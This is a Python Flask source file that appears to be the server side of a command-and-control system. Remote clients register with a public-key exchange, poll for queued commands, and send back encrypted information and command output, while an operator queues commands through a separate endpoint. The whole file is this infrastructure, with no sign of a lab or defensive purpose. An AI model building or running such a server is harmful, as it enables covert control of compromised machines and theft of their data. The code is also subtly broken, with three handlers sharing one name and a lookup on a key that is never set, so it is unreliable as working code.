import logging
from flask import Flask, request
import uuid
from ec import Ecrypt
from mq import MessageQueue
from rq import ResponseQueue

app = Flask(__name__)
clients = []
message_queue = MessageQueue()
local_queue = ResponseQueue()

@app.route('/hello', methods=['POST'])
def hello():
    cli = {}
    cli["uid"] = str(uuid.uuid4())
    cli["pbk"] = request.form.get("pbk")
    cli["cs"] = Ecrypt(isServer=True)
    clients.append(cli)
    pubkey = cli["cs"].public_key_to_string()
    return {"pbk":pubkey ,"uid": cli["uid"] }


@app.route('/info/<cid>', methods=['POST'])
def get_next_command(cid):
    cli = None
    for c in clients:
        if c["uid"] == cid:
            cli = c
    if not cli:
        return {"msg":"why?"}
    infos = cli["cs"].decrypt(request.form.get("info"))
    local_queue.add_message(cid,infos)
    return {}, 200


@app.route('/cmd/<cid>', methods=['GET'])
def get_next_command(cid):
    message = message_queue.get_next_message(cid)
    if message:
        return message
    else:
        return {}
    
@app.route('/return/<cid>', methods=['POST'])
def get_next_command(cid):
    cli = None
    for c in clients:
        if c["uid"] == cid:
            cli = c
    if not cli:
        return {"msg":"why?"}
    infos={"id":request.form.get("id")}
    infos["data"] = cli["cs"].decrypt(request.form.get("data"))
    local_queue.add_message(cid,infos)
    return {}, 200


@app.route('/command', methods=['POST'])
def receive_cmd():
    id = request.form.get('id')
    cid = request.form.get('cid')
    cmd = request.form.get('output')
    cs = None
    for client in clients:
        if client["cid"] == cid:
            cs = client["cs"]
    if not cs:
        return {"message": "Realy?"}, 500
    ret = cs.decrypt(cmd)
    print(f"Return from cid:{cid}-id:{id}")
    print(ret)
    return {"ok": "ok"}, 200


@app.route('/add_message', methods=['POST'])
def add_message():
    data = request.get_json()
    user_id = data['user_id']
    message = data['message']
    message_queue.add_message(user_id, message)
    return {"status": f"Message added successfully for user with ID:{str(user_id)} "}


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)